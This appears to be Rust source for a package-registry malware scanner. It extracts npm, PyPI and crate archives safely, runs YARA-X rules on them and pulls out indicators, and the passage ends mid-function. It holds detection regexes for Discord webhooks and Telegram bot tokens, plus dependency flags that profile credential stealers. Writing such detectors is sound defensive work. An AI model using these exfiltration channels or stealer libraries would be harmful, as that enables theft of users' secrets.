use std::{
    collections::{BTreeMap, BTreeSet, HashSet},
    ffi::OsStr,
    fs, io,
    path::{Component, Path, PathBuf},
    sync::{Arc, LazyLock, Mutex},
};

use anyhow::{Context, Result, anyhow};
use flate2::read::GzDecoder;
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};
use tar::Archive as TarArchive;
use tempfile::tempdir;
use tokio::{fs as tokio_fs, io::AsyncWriteExt, task};
use yara_x::{Compiler, MetaValue, Rules, ScanOptions, Scanner};
use zip::ZipArchive;

use crate::{
    bounded_map::BoundedMap,
    capture::{CapturedRelease, ReleaseStatus},
    detection::rule_behavior_profile,
    event::{DetectionMatchClass, Ecosystem},
};

const DEFAULT_RULES_DIR: &str = "rules/content-risk";
const DEFAULT_MAX_SCANNED_FILES: usize = 32;
const DEFAULT_MAX_FILE_BYTES: usize = 256 * 1024;
const DEFAULT_MAX_PATTERN_MATCHES_PER_PATTERN: usize = 8;
const DEFAULT_MATCH_PREVIEW_BYTES: usize = 96;
const MAX_ARCHIVE_ENTRIES: usize = 8_192;
const MAX_EXTRACTED_TOTAL_BYTES: u64 = 256 * 1024 * 1024;
const MAX_EXTRACTED_FILE_BYTES: u64 = 32 * 1024 * 1024;
const NPM_MODULE_META: &[u8] = b"npm";
const PYPI_MODULE_META: &[u8] = b"pypi";
const CRATE_MODULE_META: &[u8] = b"crate";
const DISABLED_MODULE_META: &[u8] = b"disabled";

static RULESET_CACHE: LazyLock<Mutex<BoundedMap<PathBuf, CachedRuleSet>>> =
    LazyLock::new(|| Mutex::new(BoundedMap::new(MAX_RULESET_CACHE_ENTRIES)));
static URL_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)\b(?:https?|wss?)://[^\s"'<>`]+"#).expect("valid URL regex")
});
static DISCORD_WEBHOOK_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)https?://(?:ptb\.)?discord(?:app)?\.com/api/webhooks/[A-Za-z0-9_\-./]+"#)
        .expect("valid Discord webhook regex")
});
static TELEGRAM_TOKEN_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\b[0-9]{8,10}:[A-Za-z0-9_-]{35}\b"#).expect("valid Telegram token regex")
});
static IPV4_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b"#).expect("valid IPv4 regex")
});
const MAX_RULESET_CACHE_ENTRIES: usize = 8;

#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq, Eq)]
pub struct ContentRiskSignal {
    pub scanned: bool,
    pub suspicious: bool,
    pub score: u32,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub factors: Vec<String>,
    pub reason: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub matches: Vec<ContentRiskMatch>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub iocs: Vec<ContentRiskIoc>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub scanned_files: Vec<ScannedContentFile>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub engine: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub rule_set_version: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContentRiskMatch {
    pub rule_id: String,
    pub namespace: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub tags: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub match_class: Option<DetectionMatchClass>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub behavior_tags: Vec<String>,
    pub score: u32,
    pub file_path: String,
    pub file_role: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub matched_patterns: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub pattern_matches: Vec<ContentRiskPatternMatch>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub evidence_kind: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContentRiskPatternMatch {
    pub pattern_id: String,
    pub range_start: usize,
    pub range_end: usize,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub xor_key: Option<u8>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub preview: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
pub struct ContentRiskIoc {
    pub kind: String,
    pub value: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file_path: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ScannedContentFile {
    pub path: String,
    pub role: String,
    pub size_bytes: u64,
    pub text: bool,
}

#[derive(Debug, Clone)]
struct CachedRuleSet {
    fingerprint: String,
    rules: Arc<Rules>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ArtifactKind {
    TarGz,
    Zip,
}

#[derive(Debug, Clone)]
enum ArtifactSource {
    Url(String),
    LocalPath(PathBuf),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum FileRole {
    Archive,
    Manifest,
    InstallScript,
    BuildScript,
    Entrypoint,
    Binary,
    Module,
}

impl FileRole {
    fn as_str(self) -> &'static str {
        match self {
            Self::Archive => "archive",
            Self::Manifest => "manifest",
            Self::InstallScript => "install_script",
            Self::BuildScript => "build_script",
            Self::Entrypoint => "entrypoint",
            Self::Binary => "binary",
            Self::Module => "module",
        }
    }

    fn priority(self) -> usize {
        match self {
            Self::Archive => 0,
            Self::Manifest => 1,
            Self::InstallScript => 2,
            Self::BuildScript => 3,
            Self::Entrypoint => 4,
            Self::Binary => 5,
            Self::Module => 6,
        }
    }
}

#[derive(Debug, Clone)]
struct PackageScanContext {
    ecosystem: Ecosystem,
    package_name: String,
    package_version: String,
    has_install_script: bool,
    has_build_script: bool,
    has_bin: bool,
    has_repository: bool,
    windows_target: bool,
    dependency_count: usize,
    dependency_flags: DependencyFlags,
}

#[derive(Debug, Clone, Default)]
struct DependencyFlags {
    primno_dpapi: bool,
    koffi: bool,
    sqlite3: bool,
    screenshot_desktop: bool,
    rcedit: bool,
    archiver: bool,
    adm_zip: bool,
    tar: bool,
    ws: bool,
    axios: bool,
    form_data: bool,
}

#[derive(Debug, Clone)]
struct ScanTarget {
    path: String,
    role: FileRole,
    bytes: Vec<u8>,
    text: bool,
    size_bytes: u64,
}

pub async fn scan_captured_release(
    http: &reqwest::Client,
    capture_dir: &Path,
    capture: &CapturedRelease,
) -> ContentRiskSignal {
    match scan_captured_release_inner(http, capture_dir, capture).await {
        Ok(signal) => signal,
        Err(error) => ContentRiskSignal {
            scanned: false,
            suspicious: false,
            score: 0,
            factors: Vec::new(),
            reason: "content-risk scan failed".to_string(),
            matches: Vec::new(),
            iocs: Vec::new(),
            scanned_files: Vec::new(),
            engine: Some("yara_x".to_string()),
            rule_set_version: None,
            error: Some(error.to_string()),
        },
    }
}

pub fn captured_content_risk(capture: &CapturedRelease) -> ContentRiskSignal {
    capture
        .details
        .get("content_risk")
        .cloned()
        .and_then(|value| serde_json::from_value::<ContentRiskSignal>(value).ok())
        .unwrap_or_else(|| ContentRiskSignal {
            scanned: false,
            suspicious: false,
            score: 0,
            factors: Vec::new(),
            reason: "content risk not scanned".to_string(),
            matches: Vec::new(),
            iocs: Vec::new(),
            scanned_files: Vec::new(),
            engine: None,
            rule_set_version: None,
            error: None,
        })
}

async fn scan_captured_release_inner(
    http: &reqwest::Client,
    capture_dir: &Path,
    capture: &CapturedRelease,
) -> Result<ContentRiskSignal> {
    if !matches!(
        capture.status,
        ReleaseStatus::Active | ReleaseStatus::Yanked | ReleaseStatus::Unknown
    ) {
        return Ok(skipped_signal(
            "content-risk scan skipped for inactive release",
        ));
    }

    let Some((artifact_source, artifact_kind, artifact_name)) =
        artifact_source_for_capture(capture_dir, capture)
    else {
        return Ok(skipped_signal(
            "content-risk scan skipped: no artifact source",
        ));
    };

    let workspace = tempdir().context("failed to create content-risk workspace")?;
    let archive_path = workspace.path().join(&artifact_name);
    materialize_artifact(http, &artifact_source, &archive_path).await?;
    let archive_bytes = tokio_fs::read(&archive_path)
        .await
        .with_context(|| format!("failed to read {}", archive_path.display()))?;

    let (package_context, scan_targets) = if matches!(
        capture.ecosystem,
        Ecosystem::Npm | Ecosystem::Pypi | Ecosystem::CratesIo
    ) {
        (
            PackageScanContext::from_capture(capture, None)?,
            // Package archive semantics belong in ecosystem YARA-X modules.
            // The product passes the raw artifact and persists the result, but
            // it does not decide which package files are semantically important.
            archive_scan_target(capture.ecosystem, artifact_name.as_str(), &archive_bytes)
                .into_iter()
                .collect::<Vec<_>>(),
        )
    } else {
        let extracted_dir = workspace.path().join("extracted");
        tokio_fs::create_dir_all(&extracted_dir)
            .await
            .with_context(|| format!("failed to create {}", extracted_dir.display()))?;
        extract_artifact(&archive_path, &extracted_dir, artifact_kind).await?;

        let scan_root = normalize_scan_root(&extracted_dir)?;
        let package_context = PackageScanContext::from_capture(capture, Some(&scan_root))?;
        let mut scan_targets = collect_scan_targets(&scan_root, capture)?;
        if let Some(archive_target) =
            archive_scan_target(capture.ecosystem, artifact_name.as_str(), &archive_bytes)
        {
            scan_targets.insert(0, archive_target);
        }
        (package_context, scan_targets)
    };

    if scan_targets.is_empty() {
        return Ok(skipped_signal(
            "content-risk scan skipped: no meaningful extracted files",
        ));
    }

    let rules_dir = content_risk_rules_dir();
    let (rules, fingerprint) = load_ruleset(&rules_dir)?;
    let matches = run_yara_scan(&rules, &package_context, &scan_targets)?;
    let iocs = extract_iocs(&scan_targets);
    let scanned_files = scan_targets
        .iter()
        .map(|target| ScannedContentFile {
            path: target.path.clone(),
            role: target.role.as_str().to_string(),
            size_bytes: target.size_bytes,
            text: target.text,
        })
        .collect::<Vec<_>>();

    let mut factors = matches
        .iter()
        .map(|matched| matched.rule_id.clone())
        .collect::<BTreeSet<_>>()
        .into_iter()
        .collect::<Vec<_>>();
    if !iocs.is_empty() {
        factors.push("iocs_extracted".to_string());
    }

    let score = matches.iter().map(|matched| matched.score).sum::<u32>();
    let suspicious = score >= 8;
    let reason = matches
        .iter()
        .max_by_key(|matched| matched.score)
        .map(|matched| {
            matched
                .description
                .clone()
                .unwrap_or_else(|| format!("content-risk rule matched: {}", matched.rule_id))
        })
        .unwrap_or_else(|| "no content-risk rules matched".to_string());

    Ok(ContentRiskSignal {
        scanned: true,
        suspicious,
        score,
        factors,
        reason,
        matches,
        iocs,
        scanned_files,
        engine: Some("yara_x".to_string()),
        rule_set_version: Some(fingerprint),
        error: None,
    })
}

fn skipped_signal(reason: &str) -> ContentRiskSignal {
    ContentRiskSignal {
        scanned: false,
        suspicious: false,
        score: 0,
        factors: Vec::new(),
        reason: reason.to_string(),
        matches: Vec::new(),
        iocs: Vec::new(),
        scanned_files: Vec::new(),
        engine: Some("yara_x".to_string()),
        rule_set_version: None,
        error: None,
    }
}

impl PackageScanContext {
    fn from_capture(capture: &CapturedRelease, scan_root: Option<&Path>) -> Result<Self> {
        let dependencies = capture
            .details
            .get("dependencies")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .filter_map(Value::as_str)
            .map(|dependency| dependency.to_ascii_lowercase())
            .collect::<HashSet<_>>();

        Ok(Self {
            ecosystem: capture.ecosystem,
            package_name: capture.package.clone(),
            package_version: capture.version.clone(),
            has_install_script: capture
                .details
                .get("has_install_scripts")
                .and_then(Value::as_bool)
                .unwrap_or(false),
            has_build_script: scan_root.is_some_and(|scan_root| {
                scan_root.join("build.rs").exists() || scan_root.join("setup.py").exists()
            }),
            has_bin: capture
                .details
                .get("bin")
                .is_some_and(|value| !value.is_null()),
            has_repository: capture.upstream_repository.is_some()
                || capture
                    .details
                    .get("repository")
                    .is_some_and(|value| !value.is_null()),
            windows_target: capture
                .details
                .get("pkg_targets")
                .and_then(Value::as_array)
                .into_iter()
                .flatten()
                .filter_map(Value::as_str)
                .any(|target| target.to_ascii_lowercase().contains("win")),
            dependency_count: dependencies.len(),
            dependency_flags: DependencyFlags {
                primno_dpapi: dependencies.contains("@primno/dpapi"),
                koffi: dependencies.contains("koffi"),
                sqlite3: dependencies.contains("sqlite3"),
                screenshot_desktop: dependencies.contains("screenshot-desktop"),
                rcedit: dependencies.contains("rcedit"),
                archiver: dependencies.contains("archiver"),
                adm_zip: dependencies.contains("adm-zip"),
                tar: dependencies.contains("tar"),
                ws: dependencies.contains("ws"),
                axios: dependencies.contains("axios"),
                form_data: dependencies.contains("form-data"),
            },
        })
    }
}

fn artifact_source_for_capture(
    capture_dir: &Path,
    capture: &CapturedRelease,
) -> Option<(ArtifactSource, ArtifactKind, String)> {
    if let Some(path) = capture
        .details
        .pointer("/local_artifact/path")
        .and_then(Value::as_str)
    {
        let configured_path = PathBuf::from(path);
        let artifact_path = if configured_path.is_absolute() {
            configured_path
        } else {
            capture_dir.join(configured_path)
        };
        let filename = artifact_path
            .file_name()
            .and_then(OsStr::to_str)?
            .to_string();
        let kind = artifact_kind_from_filename(&filename)?;
        return Some((ArtifactSource::LocalPath(artifact_path), kind, filename));
    }

    capture.artifacts.iter().find_map(|artifact| {
        let url = artifact.url.clone()?;
        let kind = artifact_kind_for_artifact(artifact)?;
        Some((ArtifactSource::Url(url), kind, artifact.filename.clone()))
    })
}

fn artifact_kind_for_artifact(artifact: &crate::capture::CapturedArtifact) -> Option<ArtifactKind> {
    match artifact.kind.as_deref() {
        Some("npm-tarball") | Some("crate") | Some("sdist") => Some(ArtifactKind::TarGz),
        Some("bdist_wheel") => Some(ArtifactKind::Zip),
        _ => artifact_kind_from_filename(&artifact.filename),
    }
}

fn artifact_kind_from_filename(filename: &str) -> Option<ArtifactKind> {
    let lower = filename.to_ascii_lowercase();
    if lower.ends_with(".tgz") || lower.ends_with(".tar.gz") || lower.ends_with(".crate") {
        Some(ArtifactKind::TarGz)
    } else if lower.ends_with(".whl") || lower.ends_with(".zip") {
        Some(ArtifactKind::Zip)
    } else {
        None
    }
}

async fn materialize_artifact(
    http: &reqwest::Client,
    source: &ArtifactSource,
    destination: &Path,
) -> Result<()> {
    match source {
        ArtifactSource::Url(url) => {
            let response = http
                .get(url)
                .send()
                .await
                .with_context(|| format!("failed to request artifact {url}"))?
                .error_for_status()
                .with_context(|| format!("artifact download returned an error for {url}"))?;
            let bytes = response
                .bytes()
                .await
                .with_context(|| format!("failed to read artifact body from {url}"))?;
            let mut file = tokio_fs::File::create(destination)
                .await
                .with_context(|| format!("failed to create {}", destination.display()))?;
            file.write_all(&bytes)
                .await
                .with_context(|| format!("failed to write {}", destination.display()))?;
            file.flush()
                .await
                .with_context(|| format!("failed to flush {}", destination.display()))?;
            Ok(())
        }
        ArtifactSource::LocalPath(path) => {
            tokio_fs::copy(path, destination).await.with_context(|| {
                format!(
                    "failed to copy local artifact {} to {}",
                    path.display(),
                    destination.display()
                )
            })?;
            Ok(())
        }
    }
}

async fn extract_artifact(archive: &Path, destination: &Path, kind: ArtifactKind) -> Result<()> {
    tokio_fs::create_dir_all(destination)
        .await
        .with_context(|| format!("failed to create {}", destination.display()))?;

    let archive = archive.to_path_buf();
    let destination = destination.to_path_buf();
    task::spawn_blocking(move || match kind {
        ArtifactKind::Zip => extract_zip_archive(&archive, &destination),
        ArtifactKind::TarGz => extract_tar_gz_archive(&archive, &destination),
    })
    .await
    .context("extractor task join failed")?
}

fn extract_tar_gz_archive(archive: &Path, destination: &Path) -> Result<()> {
    let file =
        fs::File::open(archive).with_context(|| format!("failed to open {}", archive.display()))?;
    let decoder = GzDecoder::new(file);
    let mut archive_reader = TarArchive::new(decoder);
    let mut entry_count = 0usize;
    let mut total_bytes = 0u64;

    for entry in archive_reader
        .entries()
        .with_context(|| format!("failed to read entries from {}", archive.display()))?
    {
        let mut entry =
            entry.with_context(|| format!("failed to read entry from {}", archive.display()))?;
        entry_count += 1;
        if entry_count > MAX_ARCHIVE_ENTRIES {
            return Err(anyhow!(
                "archive {} exceeds maximum entry count ({MAX_ARCHIVE_ENTRIES})",
                archive.display()
            ));
        }

        let entry_type = entry.header().entry_type();
        let relative = sanitize_archive_path(
            entry
                .path()
                .with_context(|| format!("failed to read path from {}", archive.display()))?
                .as_ref(),
        )?;
        let target = destination.join(&relative);

        if entry_type.is_dir() {
            fs::create_dir_all(&target)
                .with_context(|| format!("failed to create {}", target.display()))?;
            continue;
        }

        if !entry_type.is_file() {
            return Err(anyhow!(
                "archive {} contains unsupported entry type at {}",
                archive.display(),
                relative.display()
            ));
        }

        let size = entry.size();
        ensure_archive_size_limits(archive, relative.as_path(), &mut total_bytes, size)?;
        write_archive_file(&mut entry, &target)?;
    }

    Ok(())
}

fn extract_zip_archive(archive: &Path, destination: &Path) -> Result<()> {
    let file =
        fs::File::open(archive).with_context(|| format!("failed to open {}", archive.display()))?;
    let mut zip =
        ZipArchive::new(file).with_context(|| format!("failed to open {}", archive.display()))?;
    let mut total_bytes = 0u64;

    if zip.len() > MAX_ARCHIVE_ENTRIES {
        return Err(anyhow!(
            "archive {} exceeds maximum entry count ({MAX_ARCHIVE_ENTRIES})",
            archive.display()
        ));
    }

    for index in 0..zip.len() {
        let mut entry = zip
            .by_index(index)
            .with_context(|| format!("failed to read entry #{index} from {}", archive.display()))?;
        let relative = entry.enclosed_name().ok_or_else(|| {
            anyhow!(
                "archive {} contains invalid path {}",
                archive.display(),
                entry.name()
            )
        })?;
        let relative = sanitize_archive_path(&relative)?;
        let target = destination.join(&relative);

        if entry.is_dir() {
            fs::create_dir_all(&target)
                .with_context(|| format!("failed to create {}", target.display()))?;
            continue;
        }

        let size = entry.size();
        ensure_archive_size_limits(archive, relative.as_path(), &mut total_bytes, size)?;
        write_archive_file(&mut entry, &target)?;
    }

    Ok(())
}

fn sanitize_archive_path(path: &Path) -> Result<PathBuf> {
    let mut sanitized = PathBuf::new();
    for component in path.components() {
        match component {
            Component::Normal(part) => sanitized.push(part),
            Component::CurDir => {}
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                return Err(anyhow!(
                    "archive entry uses an unsafe path component: {}",
                    path.display()
                ));
            }
        }
    }

    if sanitized.as_os_str().is_empty() {
        return Err(anyhow!("archive entry path is empty"));
    }

    Ok(sanitized)
}

fn ensure_archive_size_limits(
    archive: &Path,
    relative: &Path,
    total_bytes: &mut u64,
    size: u64,
) -> Result<()> {
    if size > MAX_EXTRACTED_FILE_BYTES {
        return Err(anyhow!(
            "archive {} entry {} exceeds per-file limit ({MAX_EXTRACTED_FILE_BYTES} bytes)",
            archive.display(),
            relative.display()
        ));
    }

    *total_bytes = total_bytes
        .checked_add(size)
        .ok_or_else(|| anyhow!("archive {} total size overflowed", archive.display()))?;
    if *total_bytes > MAX_EXTRACTED_TOTAL_BYTES {
        return Err(anyhow!(
            "archive {} exceeds total extracted size limit ({MAX_EXTRACTED_TOTAL_BYTES} bytes)",
            archive.display()
        ));
    }

    Ok(())
}

fn write_archive_file(reader: &mut impl io::Read, target: &Path) -> Result<()> {
    if let Some(parent) = target.parent() {
        fs::create_dir_all(parent)
            .with_context(|| format!("failed to create {}", parent.display()))?;
    }

    let mut file = fs::File::create(target)
        .with_context(|| format!("failed to create {}", target.display()))?;
    io::copy(reader, &mut file).with_context(|| format!("failed to write {}", target.display()))?;
    Ok(())
}

fn normalize_scan_root(extracted_dir: &Path) -> Result<PathBuf> {
    let mut root = extracted_dir.to_path_buf();
    loop {
        let mut entries = fs::read_dir(&root)
            .with_context(|| format!("failed to read {}", root.display()))?
            .filter_map(|entry| entry.ok())
            .collect::<Vec<_>>();
        if entries.len() != 1 {
            break;
        }
        let entry = entries.pop().expect("single directory entry");
        let path = entry.path();
        if path.is_dir() {
            root = path;
        } else {
            break;
        }
    }
    Ok(root)
}

fn collect_scan_targets(scan_root: &Path, capture: &CapturedRelease) -> Result<Vec<ScanTarget>> {
    let all_files = collect_files(scan_root)?;
    let mut prioritized = BTreeMap::<String, FileRole>::new();

    match capture.ecosystem {
        Ecosystem::Npm => {}
        Ecosystem::Pypi => {}
        Ecosystem::CratesIo => {}
    }

    add_fallback_source_targets(capture.ecosystem, &all_files, &mut prioritized);
    add_binary_targets(&all_files, &mut prioritized);

    let mut ordered = prioritized
        .into_iter()
        .map(|(path, role)| {
            let absolute_path = all_files
                .get(&path)
                .cloned()
                .ok_or_else(|| anyhow!("missing collected file path {path}"))?;
            Ok((role.priority(), path, role, absolute_path))
        })
        .collect::<Result<Vec<_>>>()?;
    ordered.sort_by(|left, right| left.0.cmp(&right.0).then(left.1.cmp(&right.1)));

    ordered
        .into_iter()
        .take(DEFAULT_MAX_SCANNED_FILES)
        .map(|(_, path, role, absolute_path)| {
            let metadata = fs::metadata(&absolute_path)
                .with_context(|| format!("failed to stat {}", absolute_path.display()))?;
            let size_bytes = metadata.len();
            if size_bytes > DEFAULT_MAX_FILE_BYTES as u64 {
                return Ok(None);
            }
            let bytes = fs::read(&absolute_path)
                .with_context(|| format!("failed to read {}", absolute_path.display()))?;
            let text = looks_like_text(&bytes);
            Ok(Some(ScanTarget {
                path,
                role,
                bytes,
                text,
                size_bytes,
            }))
        })
        .filter_map(|result| match result {
            Ok(Some(target)) => Some(Ok(target)),
            Ok(None) => None,
            Err(error) => Some(Err(error)),
        })
        .collect::<Result<Vec<_>>>()
}

fn archive_scan_target(
    ecosystem: Ecosystem,
    artifact_name: &str,
    archive_bytes: &[u8],
) -> Option<ScanTarget> {
    if !matches!(
        ecosystem,
        Ecosystem::Npm | Ecosystem::Pypi | Ecosystem::CratesIo
    ) {
        return None;
    }

    Some(ScanTarget {
        path: artifact_name.to_string(),
        role: FileRole::Archive,
        bytes: archive_bytes.to_vec(),
        text: false,
        size_bytes: archive_bytes.len() as u64,
    })
}

fn add_fallback_source_targets(
    ecosystem: Ecosystem,
    all_files: &BTreeMap<String, PathBuf>,
    prioritized: &mut BTreeMap<String, FileRole>,
) {
    let suffixes: &[&str] = match ecosystem {
        Ecosystem::Npm => &[".js", ".mjs", ".cjs"],
        Ecosystem::Pypi => &[".py"],
        Ecosystem::CratesIo => &[".rs"],
    };

    let candidates = all_files
        .keys()
        .filter(|path| {
            suffixes.iter().any(|suffix| path.ends_with(suffix))
                && !prioritized.contains_key(path.as_str())
        })
        .cloned()
        .collect::<Vec<_>>();
    for path in candidates {
        insert_role(prioritized, path.clone(), FileRole::Module);
    }
}

fn add_binary_targets(
    all_files: &BTreeMap<String, PathBuf>,
    prioritized: &mut BTreeMap<String, FileRole>,
) {
    let candidates = all_files
        .keys()
        .filter(|path| is_binary_path(path) && !prioritized.contains_key(path.as_str()))
        .cloned()
        .collect::<Vec<_>>();
    for path in candidates {
        insert_role(prioritized, path.clone(), FileRole::Binary);
    }
}

fn insert_role(prioritized: &mut BTreeMap<String, FileRole>, path: String, role: FileRole) {
    match prioritized.get(&path).copied() {
        Some(existing) if existing.priority() <= role.priority() => {}
        _ => {
            prioritized.insert(path, role);
        }
    }
}

fn collect_files(root: &Path) -> Result<BTreeMap<String, PathBuf>> {
    fn walk(base: &Path, current: &Path, out: &mut BTreeMap<String, PathBuf>) -> Result<()> {
        for entry in fs::read_dir(current)
            .with_context(|| format!("failed to read {}", current.display()))?
        {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                walk(base, &path, out)?;
            } else if path.is_file() {
                let relative = path
                    .strip_prefix(base)
                    .unwrap_or(&path)
                    .to_string_lossy()
                    .replace('\\', "/");
                out.insert(relative, path);
            }
        }
        Ok(())
    }

    let mut out = BTreeMap::new();
    walk(root, root, &mut out)?;
    Ok(out)
}

fn is_binary_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    [".exe", ".dll", ".node", ".so", ".dylib"]
        .iter()
        .any(|suffix| lower.ends_with(suffix))
}

fn looks_like_text(bytes: &[u8]) -> bool {
    if bytes.is_empty() {
        return true;
    }
    !bytes.contains(&0) && std::str::from_utf8(bytes).is_ok()
}

fn load_ruleset(rules_dir: &Path) -> Result<(Arc<Rules>, String)> {
    let canonical = fs::canonicalize(rules_dir).unwrap_or_else(|_| rules_dir.to_path_buf());
    let sources = load_rule_sources(&canonical)?;
    let fingerprint = fingerprint_rule_sources(&sources);
    // Rules hot-reload when source files change. Module behavior does not:
    // changing a package-format module still requires rebuilding the YARA-X
    // build that `supply-stream` links against.

    {
        let mut cache = RULESET_CACHE
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner());
        if let Some(cached) = cache.get_cloned_refresh(&canonical)
            && cached.fingerprint == fingerprint
        {
            return Ok((cached.rules.clone(), cached.fingerprint.clone()));
        }
    }

    let rules = Arc::new(compile_rule_sources(&sources)?);
    let mut cache = RULESET_CACHE
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    cache.insert(
        canonical,
        CachedRuleSet {
            fingerprint: fingerprint.clone(),
            rules: rules.clone(),
        },
    );
    Ok((rules, fingerprint))
}

fn load_rule_sources(rules_dir: &Path) -> Result<Vec<(PathBuf, String)>> {
    fn walk(dir: &Path, out: &mut Vec<PathBuf>) -> Result<()> {
        for entry in
            fs::read_dir(dir).with_context(|| format!("failed to read {}", dir.display()))?
        {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                walk(&path, out)?;
            } else if path
                .extension()
                .and_then(OsStr::to_str)
                .is_some_and(|extension| matches!(extension, "yar" | "yara"))
            {
                out.push(path);
            }
        }
        Ok(())
    }

    if !rules_dir.exists() {
        anyhow::bail!(
            "content-risk rules dir does not exist: {}",
            rules_dir.display()
        );
    }

    let mut files = Vec::new();
    walk(rules_dir, &mut files)?;
    files.sort();
    files
        .into_iter()
        .map(|path| {
            let source = fs::read_to_string(&path)
                .with_context(|| format!("failed to read {}", path.display()))?;
            Ok((path, source))
        })
        .collect()
}

fn fingerprint_rule_sources(sources: &[(PathBuf, String)]) -> String {
    let mut hasher = Sha256::new();
    for (path, source) in sources {
        hasher.update(path.to_string_lossy().as_bytes());
        hasher.update([0u8]);
        hasher.update(source.as_bytes());
        hasher.update([0u8]);
    }
    format!("{:x}", hasher.finalize())
}

fn compile_rule_sources(sources: &[(PathBuf, String)]) -> Result<Rules> {
    let mut compiler = Compiler::new();
    define_globals(&mut compiler)?;
    for (_, source) in sources {
        compiler
            .add_source(source.as_str())
            .context("failed to compile content-risk rules")?;
    }
    Ok(compiler.build())
}

fn define_globals(compiler: &mut Compiler<'_>) -> Result<()> {
    compiler
        .define_global("ecosystem", "")?
        .define_global("package_name", "")?
        .define_global("package_version", "")?
        .define_global("file_path", "")?
        .define_global("file_role", "")?
        .define_global("is_archive", false)?
        .define_global("is_manifest", false)?
        .define_global("is_install_script", false)?
        .define_global("is_build_script", false)?
        .define_global("is_entrypoint", false)?
        .define_global("is_binary", false)?
        .define_global("is_npm", false)?
        .define_global("is_pypi", false)?
        .define_global("is_crates", false)?
        .define_global("has_install_script", false)?
        .define_global("has_build_script", false)?
        .define_global("has_bin", false)?
        .define_global("has_repository", false)?
        .define_global("windows_target", false)?
        .define_global("dependency_count", 0i64)?
        .define_global("dep_primno_dpapi", false)?
        .define_global("dep_koffi", false)?
        .define_global("dep_sqlite3", false)?
        .define_global("dep_screenshot_desktop", false)?
        .define_global("dep_rcedit", false)?
        .define_global("dep_archiver", false)?
        .define_global("dep_adm_zip", false)?
        .define_global("dep_tar", false)?
        .define_global("dep_ws", false)?
        .define_global("dep_axios", false)?
        .define_global("dep_form_data", false)?;
    Ok(())
}

fn run_yara_scan(
    rules: &Rules,
    package_context: &PackageScanContext,
    scan_targets: &[ScanTarget],
) -> Result<Vec<ContentRiskMatch>> {
    let mut scanner = Scanner::new(rules);
    scanner.max_matches_per_pattern(DEFAULT_MAX_PATTERN_MATCHES_PER_PATTERN);
    let mut matches = Vec::new();

    for target in scan_targets {
        apply_globals(&mut scanner, package_context, target)?;
        let results = scanner
            .scan_with_options(
                &target.bytes,
                module_scan_options(package_context.ecosystem),
            )
            .with_context(|| format!("content-risk scan failed for {}", target.path))?;

        for matched_rule in results.matching_rules() {
            let mut score = 1u32;
            let mut description = None;
            for (ident, value) in matched_rule.metadata() {
                match (ident, value) {
                    ("score", MetaValue::Integer(value)) if value > 0 => {
                        score = value as u32;
                    }
                    ("description", MetaValue::String(value)) => {
                        description = Some(value.to_string());
                    }
                    _ => {}
                }
            }

            let tags = matched_rule
                .tags()
                .map(|tag| tag.identifier().to_string())
                .collect::<Vec<_>>();
            let profile = rule_behavior_profile(matched_rule.identifier(), &tags);
            let mut matched_patterns = BTreeSet::new();
            let mut pattern_matches = Vec::new();
            for pattern in matched_rule.patterns().include_private(true) {
                let identifier = pattern.identifier().to_string();
                for match_ in pattern.matches() {
                    let range = match_.range();
                    matched_patterns.insert(identifier.clone());
                    pattern_matches.push(ContentRiskPatternMatch {
                        pattern_id: identifier.clone(),
                        range_start: range.start,
                        range_end: range.end,
                        xor_key: match_.xor_key(),
                        preview: Some(match_preview(match_.data())),
                    });
                }
            }
            pattern_matches.sort_by(|left, right| {
                left.pattern_id
                    .cmp(&right.pattern_id)
                    .then(left.range_start.cmp(&right.range_start))
                    .then(left.range_end.cmp(&right.range_end))
            });
            let evidence_kind = if pattern_matches.is_empty() {
                Some("module_condition".to_string())
            } else {
                Some("pattern".to_string())
            };

            matches.push(ContentRiskMatch {
                rule_id: matched_rule.identifier().to_string(),
                namespace: matched_rule.namespace().to_string(),
                tags,
                match_class: Some(profile.match_class),
                behavior_tags: profile.behavior_tags,
                score,
